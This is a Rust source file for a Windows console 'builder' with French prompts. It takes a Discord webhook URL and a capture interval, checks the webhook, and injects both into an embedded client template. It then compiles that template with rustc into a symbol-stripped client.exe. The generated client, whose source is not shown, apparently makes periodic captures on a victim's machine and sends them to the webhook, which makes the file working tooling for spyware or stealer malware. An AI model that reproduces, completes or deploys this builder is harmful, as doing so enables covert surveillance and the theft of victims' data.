use std::ffi::c_void;
use std::io::{self, Write};
use std::path::PathBuf;
use std::process::Command;
use std::ptr;

const CLIENT_SRC: &str = include_str!("client.rs");

type HANDLE = isize;

const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;
const WINHTTP_FLAG_SECURE: u32 = 0x00800000;
const WINHTTP_QUERY_STATUS_CODE: u32 = 19;

#[link(name = "winhttp")]
extern "system" {
    fn WinHttpOpen(
        agent: *const u16,
        access: u32,
        proxy: *const u16,
        bypass: *const u16,
        flags: u32,
    ) -> HANDLE;
    fn WinHttpConnect(session: HANDLE, server: *const u16, port: u16, reserved: u32) -> HANDLE;
    fn WinHttpOpenRequest(
        conn: HANDLE,
        verb: *const u16,
        object: *const u16,
        version: *const u16,
        referrer: *const u16,
        accept: *const *const u16,
        flags: u32,
    ) -> HANDLE;
    fn WinHttpSetTimeouts(
        handle: HANDLE,
        resolve: i32,
        connect: i32,
        send: i32,
        receive: i32,
    ) -> i32;
    fn WinHttpSendRequest(
        req: HANDLE,
        headers: *const u16,
        headers_len: u32,
        body: *mut u8,
        body_len: u32,
        total_len: u32,
        context: usize,
    ) -> i32;
    fn WinHttpReceiveResponse(req: HANDLE, reserved: *mut u8) -> i32;
    fn WinHttpQueryHeaders(
        req: HANDLE,
        info: u32,
        name: *const u16,
        buffer: *mut c_void,
        buffer_len: *mut u32,
        index: *mut u32,
    ) -> i32;
    fn WinHttpCloseHandle(handle: HANDLE) -> i32;
}

#[repr(C)]
#[derive(Clone, Copy)]
struct Coord {
    x: i16,
    y: i16,
}

#[repr(C)]
struct SmallRect {
    left: i16,
    top: i16,
    right: i16,
    bottom: i16,
}

#[repr(C)]
struct ConsoleBufferInfo {
    size: Coord,
    cursor: Coord,
    attributes: u16,
    window: SmallRect,
    max_window: Coord,
}

#[link(name = "kernel32")]
extern "system" {
    fn GetLastError() -> u32;
    fn GetStdHandle(kind: u32) -> HANDLE;
    fn GetConsoleScreenBufferInfo(handle: HANDLE, info: *mut ConsoleBufferInfo) -> i32;
    fn FillConsoleOutputCharacterW(
        handle: HANDLE,
        character: u16,
        length: u32,
        start: Coord,
        written: *mut u32,
    ) -> i32;
    fn FillConsoleOutputAttribute(
        handle: HANDLE,
        attribute: u16,
        length: u32,
        start: Coord,
        written: *mut u32,
    ) -> i32;
    fn SetConsoleCursorPosition(handle: HANDLE, position: Coord) -> i32;
}

#[link(name = "msvcrt")]
extern "C" {
    fn _getch() -> i32;
}

fn main() {
    'menu: loop {
        clear_screen();
        println!("=== builder ===");
        print!("webhook discord: ");
        let _ = io::stdout().flush();
        let candidate = read_line();
        if candidate.is_empty() {
            return;
        }

        match test_webhook(&candidate) {
            Ok(200) => println!("\n  valide\n"),
            Ok(_) | Err(_) => {
                println!("\n  weeboook invalide\n");
                pause_continue();
                continue 'menu;
            }
        }

        let webhook = candidate;
        let raw_interval = prompt("secondes entre chaque capture (defaut 10 secondes): ");
        let interval: u64 = if raw_interval.is_empty() {
            10
        } else {
            raw_interval.parse().unwrap_or(10)
        };

        let root = std::env::current_exe()
            .ok()
            .and_then(|path| path.parent().map(|parent| parent.to_path_buf()))
            .unwrap_or_else(|| {
                std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
            });
        let build_dir = root.join("build");
        if let Err(err) = std::fs::create_dir_all(&build_dir) {
            eprintln!("erreur: {}", err);
            std::process::exit(1);
        }
        let out = build_dir.join("client.exe");

        print!("\n  creation... ");
        let _ = io::stdout().flush();

        if out.exists() && std::fs::remove_file(&out).is_err() {
            eprintln!("\nerreur: impossible de remplacer client.exe");
            std::process::exit(1);
        }

        let escaped = webhook.replace('\\', "\\\\").replace('"', "\\\"");
        let source = CLIENT_SRC
            .replace("__WEBHOOK_URL__", &escaped)
            .replace("__INTERVAL_SECS__", &interval.to_string());

        let rustc = find_rustc().unwrap_or_else(|| {
            eprintln!("\nerreur: rustc introuvable");
            std::process::exit(1);
        });

        let tmp = std::env::temp_dir().join(format!("builder_build_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let _ = std::fs::create_dir_all(&tmp);
        let src_file = tmp.join("client_src.rs");
        let exe_file = tmp.join("client.exe");
        std::fs::write(&src_file, &source).expect("ecriture source impossible");

        if !compile(&rustc, &src_file, &exe_file, true)
            && !compile(&rustc, &src_file, &exe_file, false)
        {
            eprintln!("\nerreur: compilation");
            std::process::exit(1);
        }

        if let Err(err) = std::fs::copy(&exe_file, &out) {
            eprintln!("\nerreur: {}", err);
            std::process::exit(1);
        }
        let _ = std::fs::remove_dir_all(&tmp);

        println!("ok\n");
        println!("pret: build\\client.exe\n");
        pause_continue();
        return;
    }
}

fn clear_screen() {
    unsafe {
        let handle = GetStdHandle(0xFFFFFFF5);
        let mut info: ConsoleBufferInfo = std::mem::zeroed();
        if GetConsoleScreenBufferInfo(handle, &mut info) == 0 {
            return;
        }
        let cells = info.size.x as u32 * info.size.y as u32;
        let origin = Coord { x: 0, y: 0 };
        let mut written = 0u32;
        FillConsoleOutputCharacterW(handle, b' ' as u16, cells, origin, &mut written);
        FillConsoleOutputAttribute(handle, info.attributes, cells, origin, &mut written);
        SetConsoleCursorPosition(handle, origin);
    }
}

fn pause_continue() {
    print!("appuyez sur une touche pour continuer... ");
    let _ = io::stdout().flush();
    unsafe {
        let _ = _getch();
    }
    println!();
}

fn test_webhook(url: &str) -> Result<u32, String> {
    let (host, path) = parse_webhook(url)?;

    let agent = wide("builder-webhook-check/1.0");
    let server = wide(host);
    let object = wide(&path);
    let verb = wide("GET");

    unsafe {
        let session = WinHttpOpen(
            agent.as_ptr(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            ptr::null(),
            ptr::null(),
            0,
        );
        if session == 0 {
            return Err(winhttp_error(GetLastError()));
        }
        WinHttpSetTimeouts(session, 5000, 5000, 5000, 10000);

        let conn = WinHttpConnect(session, server.as_ptr(), 443, 0);
        if conn == 0 {
            let err = GetLastError();
            WinHttpCloseHandle(session);
            return Err(winhttp_error(err));
        }

        let req = WinHttpOpenRequest(
            conn,
            verb.as_ptr(),
            object.as_ptr(),
            ptr::null(),
            ptr::null(),
            ptr::null(),
            WINHTTP_FLAG_SECURE,
        );
        if req == 0 {
            let err = GetLastError();
            WinHttpCloseHandle(conn);
            WinHttpCloseHandle(session);
            return Err(winhttp_error(err));
        }

        let outcome: Result<u32, String>;

        if WinHttpSendRequest(req, ptr::null(), 0, ptr::null_mut(), 0, 0, 0) == 0
        {
            outcome = Err(winhttp_error(GetLastError()));
        } else if WinHttpReceiveResponse(req, ptr::null_mut()) == 0 {
            outcome = Err(winhttp_error(GetLastError()));
        } else {
            let mut buffer = [0u16; 32];
            let mut len = (buffer.len() * 2) as u32;
            if WinHttpQueryHeaders(
                req,
                WINHTTP_QUERY_STATUS_CODE,
                ptr::null(),
                buffer.as_mut_ptr() as *mut c_void,
                &mut len,
                ptr::null_mut(),
            ) != 0
            {
                let text = String::from_utf16_lossy(&buffer[..(len as usize / 2)]);
                outcome = text.trim().parse::<u32>().map_err(|_| {
                    format!("statut HTTP illisible : {}", text)
                });
            } else {
                outcome = Err(winhttp_error(GetLastError()));
            }
        }

        WinHttpCloseHandle(req);
        WinHttpCloseHandle(conn);
        WinHttpCloseHandle(session);
        outcome
    }
}

fn parse_webhook(url: &str) -> Result<(&str, String), String> {
    let rest = url
        .strip_prefix("https://")
        .ok_or_else(|| "webhook invalide".to_string())?;
    let slash = rest
        .find('/')
        .ok_or_else(|| "chemin webhook manquant".to_string())?;
    let mut host = &rest[..slash];
    let path = &rest[slash..];
    if let Some(colon) = host.rfind(':') {
        host = &host[..colon];
    }
    if host.is_empty() {
        return Err("hote vide".into());
    }

    let parts: Vec<&str> = path.trim_matches('/').split('/').collect();
    if parts.len() < 4 || parts[0] != "api" || parts[1] != "webhooks" {
        return Err("format attendu : /api/webhooks/ID/TOKEN".into());
    }
    if parts[2].is_empty() || parts[3].is_empty() {
        return Err("ID ou token manquant".into());
    }
    Ok((host, format!("/{}", parts.join("/"))))
}

fn winhttp_error(code: u32) -> String {
    let message = match code {
        87 => "parametre invalide",
        12002 => "timeout : serveur trop lent ou reseau bloque",
        12007 => "DNS non resolu : verifie la connexion",
        12017 => "acces refused : erreur de connexion WinHTTP",
        12019 => "verbe HTTP incorrect",
        12029 => "connexion impossible : pare-feu ou reseau",
        12030 => "connexion interrompue pendant l'envoi",
        12057 => "erreur TLS : certificat ou version du protocole",
        12150 => "reponse HTTPS invalide ou connexion TLS bloquee",
        12152 => "reponse serveur invalide",
        12175 => "erreur de securite TLS",
        _ => "erreur réseau",
    };
    format!("{} (code {})", message, code)
}

fn compile(rustc: &PathBuf, src: &PathBuf, out: &PathBuf, strip: bool) -> bool {
    let mut cmd = Command::new(rustc);
    cmd.arg("--edition=2021")
        .arg("-O")
        .arg("-C")
        .arg("panic=abort");
    if strip {
        cmd.arg("-C").arg("strip=symbols");
    }
    cmd.arg("-o").arg(out).arg(src);

    match cmd.output() {
        Ok(result) if result.status.success() => true,
        Ok(result) => {
            eprintln!("{}", String::from_utf8_lossy(&result.stderr));
            false
        }
        Err(err) => {
            eprintln!("rustc: {}", err);
            false
        }
    }
}

fn prompt(label: &str) -> String {
    print!("{}", label);
    let _ = io::stdout().flush();
    read_line()
}

fn read_line() -> String {
    let mut line = String::new();
    let _ = io::stdin().read_line(&mut line);
    line.trim().to_string()
}

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn find_rustc() -> Option<PathBuf> {
    if let Ok(result) = Command::new("rustc").arg("--version").output() {
        if result.status.success() {
            return Some(PathBuf::from("rustc"));
        }
    }
    let home = std::env::var("USERPROFILE").ok()?;
    let candidate = PathBuf::from(home).join(".cargo/bin/rustc.exe");
    if candidate.exists() {
        Some(candidate)
    } else {
        None
    }
}
